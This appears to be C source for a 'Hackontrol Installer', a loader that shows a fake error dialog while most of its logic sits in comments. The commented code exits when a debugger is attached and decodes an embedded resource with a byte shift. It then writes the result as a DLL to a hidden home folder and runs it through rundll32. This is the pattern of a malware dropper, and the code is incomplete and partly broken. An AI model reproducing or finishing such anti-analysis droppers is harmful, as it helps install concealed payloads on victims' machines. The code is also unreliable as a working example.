#include <stdio.h>
#include <Windows.h>
#include "resource.h"

typedef struct {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
} *PPEB;

static void displayError(const LPCWSTR function, const DWORD code) {
	LPCWSTR format = L"Hello, world!";
	int length = _scwprintf(format);

	if(length < 1) {
		return;
	}

	LPWSTR buffer = HeapAlloc(GetProcessHeap(), 0, (length + 1) * sizeof(WCHAR));

	if(!buffer) {
		return;
	}

	if(swprintf_s(buffer, length + 1, format) == -1) {
		HeapFree(GetProcessHeap(), 0, buffer);
		return;
	}

	buffer[length] = 0;
	MessageBoxW(NULL, buffer, L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	HeapFree(GetProcessHeap(), 0, buffer);
}

int main(int argc, char** argv) {
	displayError(L"HelloWorld", ERROR_ACCOUNT_EXPIRED);
	/*PPEB block = (PPEB) __readgsqword(0x60);

	if(block && block->BeingDebugged) {
		return 0;
	}

	printf("Finding resource\n");
	HRSRC handle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		displayError(L"FindResourceW", GetLastError());
		return 1;
	}

	DWORD size = SizeofResource(NULL, handle);

	if(!size) {
		displayError(L"SizeofResource", GetLastError());
		return 1;
	}

	printf("Resource size: %lu bytes\n", size);
	HGLOBAL resource = LoadResource(NULL, handle);

	if(!resource) {
		displayError(L"LoadResource", GetLastError());
		return 1;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		displayError(L"LockResource", GetLastError());
		return 1;
	}

	printf("Allocate: %lu bytes\n", size);
	PBYTE buffer = HeapAlloc(GetProcessHeap(), 0, size);

	if(!buffer) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED);
		return 1;
	}

	DWORD value;

	for(value = 0; value < size; value++) {
		buffer[value] = (data[value] - 18) % 0xFF;
	}

	HeapFree(GetProcessHeap(), 0, buffer);
	printf("Finished\n");*/
	return 0;
}

/*#define FUNCTION_LIBDLL32 "Install"

int main(int argc, char** argv) {
	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
		LocalFree(buffer);
		return 1;
	}

	if(!HackontrolCreateDirectory(folderHackontrol)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolCreateDirectory");
		LocalFree(folderHackontrol);
		LocalFree(buffer);
		return 1;
	}

	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);
	error = GetLastError();
	LocalFree(folderHackontrol);

	if(!fileLibdll32) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANFormatMessage");
		LocalFree(buffer);
		return 1;
	}

	BOOL result = HackontrolWriteFile(fileLibdll32, buffer, size);
	error = GetLastError();
	LocalFree(buffer);

	if(!result) {
		KHOPANERRORMESSAGE_WIN32(error, L"HackontrolWriteFile");
		LocalFree(fileLibdll32);
		return 1;
	}

	printf("Loading DLL\n");
	result = KHOPANExecuteRundll32Function(fileLibdll32, FUNCTION_LIBDLL32, NULL, TRUE);
	error = GetLastError();
	LocalFree(fileLibdll32);

	if(!result) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANExecuteRundll32Function");
		return 1;
	}

	return 0;
}*/
